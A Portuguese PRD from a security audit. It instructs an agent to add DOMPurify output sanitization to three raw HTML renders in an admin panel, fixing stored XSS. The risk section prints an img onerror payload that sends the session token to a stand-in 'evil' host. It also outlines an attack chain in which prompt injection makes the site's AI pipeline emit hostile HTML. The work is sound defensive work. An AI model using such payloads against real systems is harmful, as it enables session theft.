# PRD-04b — Defesa de saída no central-web (DOMPurify em todo render de HTML)

> **Metadados** — Onda 1 | Prioridade: **Quick Win** | Esforço: **Baixo** | Dependências: **PRD-08** (política CSP — backstop; pode correr em paralelo) | **Sem revisão humana obrigatória** (não toca auth, segredos nem dados sensíveis; só adiciona sanitização de saída no painel).
>
> Este PRD é **autocontido**. O agente que o implementar NÃO precisa da conversa que o gerou: todas as referências arquivo:linha, o padrão a copiar e os comandos de verificação estão escritos abaixo. Todos os números de linha foram confirmados por leitura direta do repositório em 2026-07-21.

---

## Objetivo

Eliminar o **XSS armazenado no painel central** (`central-web`): hoje três telas renderizam HTML **cru** vindo do pipeline de IA / de outra fonte não-confiável com `dangerouslySetInnerHTML`, sem nenhuma sanitização. Este PRD adiciona a biblioteca **DOMPurify** ao `central-web` (a MESMA já usada no site público do blog, versão `^3.2.4`) e faz **todo** conteúdo passar por `DOMPurify.sanitize(...)` antes de chegar ao DOM. Isso corta o **ponto de execução/exfiltração** da cadeia-mãe AP-1 (payload da IA executa no browser do admin e rouba o token de sessão).

---

## Contexto / Evidência de origem

Achado **F4** do mapa de riscos (`security-audit/02-mapa-riscos.md:52`): *"XSS armazenado no central-web + token em localStorage"* — Severidade **Alto**, ativos 2 (segredos) e 3 (integridade). Este PRD trata **apenas a metade "render cru → XSS"**. A outra metade de F4 (token de sessão no `localStorage`, `central-web/src/api.ts:6`) é tratada pelo **PRD-03** e está **fora do escopo aqui**.

Attack path **AP-1** (`security-audit/03-threat-model.md:42`), a cadeia-mãe:
> Fonte externa → injeção indireta (F2) → IA emite HTML perigoso → gate default "log" não bloqueia (F3) → armazenado → **central-web renderiza cru (F4)** → **XSS no browser do admin → exfiltra `central_token` do localStorage** → sem RBAC (F8) rotaciona segredos/lê chaves/gerencia blogs.

Na tabela STRIDE por componente (`security-audit/03-threat-model.md:62`): *"**central-web (saída)** … Controle que falta: **DOMPurify + CSP**; token fora do localStorage (04b/03)"*.

### Evidência real lida (2026-07-21)

Três pontos de render cru, **sem** sanitização (confirmado: `grep -rn "DOMPurify\|dompurify\|sanitize" artifacts/central-web` retorna **0 ocorrências** — o pacote não conhece a biblioteca):

1. **`artifacts/central-web/src/pages/News.tsx:220`** — modal "Ver conteúdo" da lista de notícias:
   ```tsx
   <div className="card" style={{ maxHeight: 320, overflow: "auto" }}
     dangerouslySetInnerHTML={{ __html: detail.rewrites[0]!.contentHtml ?? "" }} />
   ```
   `detail.rewrites[0].contentHtml` é o HTML **reescrito pela IA** a partir de fonte externa (interface `NewsDetail.rewrites[].contentHtml`, `News.tsx:25`). É exatamente o output do pipeline F2→F3.

2. **`artifacts/central-web/src/pages/Review.tsx:92`** — modal de pré-visualização da fila de aprovação:
   ```tsx
   <div className="card" style={{ maxHeight: 320, overflow: "auto" }}
     dangerouslySetInnerHTML={{ __html: preview.contentHtml ?? "" }} />
   ```
   `preview.contentHtml` (interface `ReviewItem.contentHtml`, `Review.tsx:9`) é a entrega **aguardando aprovação** — o admin abre este preview justamente para decidir; é o pior lugar para executar script do atacante.

3. **`artifacts/central-web/src/pages/NewArticle.tsx:1528`** — modal "Pré-visualização" do editor manual:
   ```tsx
   <div className="prose-editor …"
     dangerouslySetInnerHTML={{ __html: content || "<p>(sem conteúdo)</p>" }} />
   ```
   `content` é o HTML do editor TipTap; pode conter conteúdo colado/importado. Mesmo sendo do próprio operador, deve passar pelo mesmo caminho seguro (defesa em profundidade e consistência).

### Padrão já existente no repo a espelhar (fonte da verdade)

O site público do blog **já** faz isso corretamente — copiar a abordagem cliente:

- `artifacts/brasilia-agora/src/lib/sanitize.ts:8` → `import DOMPurify from "dompurify";`
- `artifacts/brasilia-agora/src/lib/sanitize.ts:71-75` → função `sanitizeArticleHtml`; no cliente retorna:
  ```ts
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  ```
- Dependência declarada: `artifacts/brasilia-agora/package.json:65` → `"dompurify": "^3.2.4"`.
- `central-web` é **100% client-side** (SPA Vite, sem SSR — `artifacts/central-web/package.json` scripts `dev`/`build`/`start` são todos vite), logo `window` sempre existe e NÃO é preciso a variante SSR "leve" (`stripDangerousHtml`) do blog. Basta chamar `DOMPurify.sanitize` direto.
- DOMPurify 3.x embute seus próprios tipos TypeScript — **não** é preciso `@types/dompurify` (o blog importa sem `@types`).

### Risco concreto

Sem sanitização, um `contentHtml` como `<img src=x onerror="fetch('https://evil/'+localStorage.central_token)">` executa no browser do admin ao abrir o modal, exfiltrando o token de sessão do painel central (`central_token`, `central-web/src/api.ts:6`) — que, sem RBAC (F8), equivale a controle total do ecossistema. OWASP **A03:2021 – Injection (Cross-Site Scripting)**; **CWE-79** (Improper Neutralization of Input During Web Page Generation — Stored XSS). CVSS aproximado **~8.0 (Alto)** no contexto da cadeia AP-1 (crítica em cadeia). Mitigação prevista no threat model: **PRD-04b** (esta) + **PRD-08** (CSP) como backstop.

---

## Pré-condições

- [ ] Criar branch de trabalho:
  ```bash
  cd "c:/Users/Usuario(a) Master/sp011"
  git checkout -b fix/prd-04b-central-web-output-defense
  ```
- [ ] Registrar o **baseline** ANTES de editar. `central-web` **não tem** suíte `node --test` (as suítes existem só em `artifacts/api-server`, `lib/news-engine`, `artifacts/central-hub`); o baseline verificável deste pacote é o **typecheck**. Rodar e anotar PASS/FAIL em `security-audit/STATUS.md` (linha do PRD-04b):
  ```bash
  cd "c:/Users/Usuario(a) Master/sp011/artifacts/central-web"
  pnpm run typecheck
  ```
  Se `security-audit/STATUS.md` não existir, criá-lo com um cabeçalho e a linha do PRD-04b (baseline: typecheck PASS/FAIL + data).
- [ ] Ler ANTES de editar (todos confirmados neste PRD):
  - `artifacts/central-web/src/pages/News.tsx` (foco linha 220)
  - `artifacts/central-web/src/pages/Review.tsx` (foco linha 92)
  - `artifacts/central-web/src/pages/NewArticle.tsx` (foco linha 1528)
  - `artifacts/central-web/package.json` (dependências)
  - `artifacts/brasilia-agora/src/lib/sanitize.ts` (padrão a copiar — linhas 8 e 71-75)
  - `pnpm-workspace.yaml` (política `minimumReleaseAge: 1440` — a instalação de `dompurify ^3.2.4` respeita a janela; a versão é antiga, sem bloqueio)

---

## Escopo (ações em ordem)

1. **Adicionar a dependência** em `artifacts/central-web/package.json`: incluir no bloco `"dependencies"` a linha `"dompurify": "^3.2.4"` (mesma versão do blog — `artifacts/brasilia-agora/package.json:65`). Manter ordenação/alfabetização coerente com o arquivo. NÃO adicionar `@types/dompurify` (DOMPurify 3.x já traz tipos).

2. **Instalar** para atualizar o lockfile (respeita `minimumReleaseAge`):
   ```bash
   cd "c:/Users/Usuario(a) Master/sp011"
   pnpm install
   ```

3. **Criar o helper de sanitização** `artifacts/central-web/src/lib/sanitize.ts` (novo arquivo, client-only), espelhando o cliente do blog:
   ```ts
   /**
    * Sanitização de HTML antes de renderizar no painel central.
    * O conteúdo vem do pipeline de IA (fonte externa reescrita) e do editor
    * manual — nunca deve chegar ao DOM cru (XSS armazenado → AP-1). central-web
    * é 100% client-side, então DOMPurify roda sempre (window existe).
    */
   import DOMPurify from "dompurify";

   export function sanitizeHtml(html: string | null | undefined): string {
     if (!html) return "";
     return DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
   }
   ```
   (Se o diretório `artifacts/central-web/src/lib/` não existir, criá-lo.)

4. **`artifacts/central-web/src/pages/News.tsx`**: importar o helper (ex.: `import { sanitizeHtml } from "../lib/sanitize";`) e, na **linha 220**, trocar
   `__html: detail.rewrites[0]!.contentHtml ?? ""`
   por
   `__html: sanitizeHtml(detail.rewrites[0]!.contentHtml)`.

5. **`artifacts/central-web/src/pages/Review.tsx`**: importar o helper e, na **linha 92**, trocar
   `__html: preview.contentHtml ?? ""`
   por
   `__html: sanitizeHtml(preview.contentHtml)`.

6. **`artifacts/central-web/src/pages/NewArticle.tsx`**: importar o helper e, na **linha 1528**, trocar
   `__html: content || "<p>(sem conteúdo)</p>"`
   por
   `__html: sanitizeHtml(content) || "<p>(sem conteúdo)</p>"`
   (a sanitização primeiro; o fallback `"(sem conteúdo)"` permanece como placeholder quando o conteúdo sanitizado for vazio).

7. **Verificar que não sobrou nenhum render cru**: garantir que **toda** ocorrência de `dangerouslySetInnerHTML` em `artifacts/central-web/src` esteja envolta por `sanitizeHtml(...)` (ou `DOMPurify.sanitize(...)`). Ver comandos abaixo.

8. **Backstop CSP (PRD-08)**: NÃO implementar CSP aqui. Apenas registrar na descrição do commit/PR que este PRD **consome** a política CSP do PRD-08 como segunda camada (mesmo com HTML sanitizado, o painel deve servir CSP restritiva). Se o PRD-08 já tiver sido entregue, confirmar que o header/meta CSP cobre `central-web`; caso contrário, deixar anotado como dependência aberta em `security-audit/STATUS.md`.

---

## Fora de escopo

- **Não** mexer no armazenamento do token (`artifacts/central-web/src/api.ts:6` `localStorage`) — é a outra metade de F4, tratada pelo **PRD-03**.
- **Não** implementar/editar a política CSP nem o Caddyfile — é o **PRD-08**.
- **Não** tocar no **write-path** de sanitização (sanitizar na gravação/ingest / no gate de qualidade do pipeline) — é o **PRD-04a** / PRD-05. Aqui a defesa é **na saída** (render).
- **Não** alterar o backend `central-hub` nem `lib/news-engine`.
- **Não** trocar `SESSION_SECRET`/`SETTINGS_ENCRYPTION_KEY` nem qualquer segredo.
- **Não** alterar a lógica de negócio das telas (filtros, aprovação, editor) — apenas envolver o `__html` com o sanitizador e adicionar o import.

---

## Comandos de verificação

Rodar nesta ordem. O resultado que caracteriza SUCESSO está declarado em cada passo.

```bash
# 0) Contexto
cd "c:/Users/Usuario(a) Master/sp011"

# 1) A dependência foi declarada (SUCESSO: imprime a linha com dompurify ^3.2.x)
grep -n '"dompurify"' artifacts/central-web/package.json

# 2) O helper existe e usa DOMPurify (SUCESSO: ambos os greps retornam linha)
grep -n 'from "dompurify"' artifacts/central-web/src/lib/sanitize.ts
grep -n 'DOMPurify.sanitize' artifacts/central-web/src/lib/sanitize.ts

# 3) TODO dangerouslySetInnerHTML está sanitizado.
#    SUCESSO: as 3 ocorrências conhecidas aparecem, cada uma na MESMA linha que
#    sanitizeHtml( (ou DOMPurify.sanitize(). Inspecionar a saída manualmente.
grep -rn "dangerouslySetInnerHTML" artifacts/central-web/src

# 4) Não sobrou render cru: nenhuma linha com dangerouslySetInnerHTML que NÃO
#    contenha "sanitize" ou "DOMPurify".
#    SUCESSO: 0 linhas retornadas.
grep -rn "dangerouslySetInnerHTML" artifacts/central-web/src | grep -v -i "sanitize" | grep -v "DOMPurify"

# 5) Os imports foram adicionados nas 3 telas
#    (SUCESSO: cada grep retorna a linha de import do helper)
grep -n "sanitize" artifacts/central-web/src/pages/News.tsx
grep -n "sanitize" artifacts/central-web/src/pages/Review.tsx
grep -n "sanitize" artifacts/central-web/src/pages/NewArticle.tsx

# 6) Typecheck do pacote (SUCESSO: termina sem erro / exit 0).
#    Obs.: o filtro de typecheck da raiz não casa no Windows — rodar por pacote.
cd "c:/Users/Usuario(a) Master/sp011/artifacts/central-web"
pnpm run typecheck
```

**Verificação de comportamento (observação objetiva, pós-build/deploy).** O `vite build` do frontend NÃO roda no Windows (só no Docker da VPS). Após o rollout do `central-web` na VPS (ver Plano de deploy abaixo), executar UMA verificação objetiva de que um payload `img onerror` **não dispara**, usando a tela de menor atrito (o editor manual, cujo `content` está sob controle do testador):

1. Abrir `https://<central>/nova-noticia` autenticado.
2. No editor, inserir o texto/HTML de teste `<img src=x onerror="window.__xss=1">` (colar como HTML ou via a inserção de conteúdo do editor).
3. Abrir o modal **Pré-visualização** (botão "olho").
4. Abrir o DevTools do navegador e conferir, de forma objetiva:
   - **SUCESSO:** no console, `window.__xss` é `undefined` (o handler não executou) **e** ao inspecionar o `<img>` renderizado no modal, o atributo `onerror` **não existe** (foi removido pelo DOMPurify). Nenhum diálogo/efeito colateral.
   - **FALHA:** `window.__xss === 1` ou o atributo `onerror` presente no DOM.

(Opcional, sanity local sem browser: um script de rascunho em `…/scratchpad` que carregue `dompurify` sob `jsdom` e afirme que `sanitizeHtml('<img src=x onerror=alert(1)>')` não contém `onerror`. Só se `jsdom` estiver disponível; NÃO adicionar `jsdom` como dependência do pacote — é apenas conveniência, não requisito de aceite.)

---

## Critérios de aceite

- [ ] `artifacts/central-web/package.json` declara `"dompurify": "^3.2.4"` no bloco `dependencies` (comando 1).
- [ ] Existe `artifacts/central-web/src/lib/sanitize.ts` que importa `dompurify` e exporta `sanitizeHtml` usando `DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })` (comando 2).
- [ ] As 3 ocorrências de `dangerouslySetInnerHTML` (News.tsx:220, Review.tsx:92, NewArticle.tsx:1528) passaram a chamar `sanitizeHtml(...)` no `__html` (comando 3).
- [ ] O comando 4 retorna **0 linhas** (nenhum `dangerouslySetInnerHTML` sem sanitização em `artifacts/central-web/src`).
- [ ] Cada uma das 3 telas importa o helper (comando 5).
- [ ] `pnpm run typecheck` do `central-web` termina sem erro (comando 6).
- [ ] Observação objetiva pós-deploy: no preview do editor, `window.__xss` fica `undefined` e o `<img>` renderizado não tem atributo `onerror` (verificação de comportamento acima).
- [ ] STATUS.md atualizado com o resultado; dependência do PRD-08 (CSP backstop) registrada como aberta ou satisfeita.

---

## Definition of Done

`grep -rn "dangerouslySetInnerHTML" artifacts/central-web/src | grep -v -i "sanitize" | grep -v "DOMPurify"` retorna **0 linhas**, o typecheck do `central-web` passa, e a verificação de comportamento pós-deploy confirma que o payload `img onerror` não executa (handler removido). STATUS.md registra a conclusão.

---

## Dependências

- **PRD-08 (política CSP)** — dependência de **backstop**, não de bloqueio: o PRD-04b pode ser implementado e mergeado **em paralelo/antes** do PRD-08. O PRD-08 adiciona a segunda camada (CSP restritiva no painel) que contém qualquer bypass residual de sanitização. Registrar o estado do PRD-08 em STATUS.md.
- **PRD-03** trata a outra metade de F4 (token fora do `localStorage`) — independente; não bloqueia este PRD, mas juntos fecham a cadeia AP-1 no cliente.
- **PRD-04a / PRD-05** (write-path / gate de qualidade) — complementares; sanitização de saída (este PRD) é defesa em profundidade e não depende deles.

---

## Prioridade e esforço

**Quick Win** — **Esforço Baixo** (Onda 1). Uma dependência já usada no repo, um helper de ~8 linhas e três substituições de uma linha. Sem mudança de auth, segredos ou schema.

---

## Plano de rollback

Mudança isolada e revertível sem efeito colateral (não toca dados nem migrações):

```bash
cd "c:/Users/Usuario(a) Master/sp011"
# reverter o commit deste PRD (substituir <hash> pelo commit de entrega)
git revert <hash>
# OU, antes de commitar, descartar as edições locais:
git checkout -- artifacts/central-web/src/pages/News.tsx \
                artifacts/central-web/src/pages/Review.tsx \
                artifacts/central-web/src/pages/NewArticle.tsx \
                artifacts/central-web/package.json
rm -f artifacts/central-web/src/lib/sanitize.ts   # se ainda não commitado
pnpm install   # restaura o lockfile sem dompurify
```

Reverter é seguro: remove a sanitização e volta ao render cru (estado anterior, vulnerável) — sem perda de dados nem quebra de sessão.

---

## Plano de deploy (VPS) — após merge na main

Serviço afetado: **`central-web`** (frontend do painel central). O `vite build` só roda no Docker da VPS.

```bash
cd /opt/sp011
git pull
docker compose build central-web
docker compose up -d central-web
```

Pós-deploy: executar a **verificação de comportamento** (payload `img onerror` no preview de `/nova-noticia`) descrita em "Comandos de verificação".

---

## Notas de execução para o agente

- Trabalhar **somente** neste PRD (PRD-04b). Não encostar em auth, segredos, CSP, token storage, write-path nem em `central-hub`.
- Se **qualquer** critério de aceite falhar após a implementação: **NÃO** marcar como concluído. Registrar o motivo exato (comando e saída) na linha do PRD-04b em `security-audit/STATUS.md` e **PARAR**.
- Ao concluir com sucesso, atualizar `security-audit/STATUS.md` (baseline → resultado final, data, hash do commit) e anotar o estado da dependência PRD-08.
- Esta mudança **não** exige revisão humana (não toca auth/segredos/dados sensíveis e é Esforço Baixo). Mesmo assim, o deploy do `central-web` deve seguir o rebuild direcionado acima — não rebuildar serviços não afetados.
- Não incluir valores de segredo em nenhum comando/exemplo. Não trocar `SESSION_SECRET`/`SETTINGS_ENCRYPTION_KEY`.
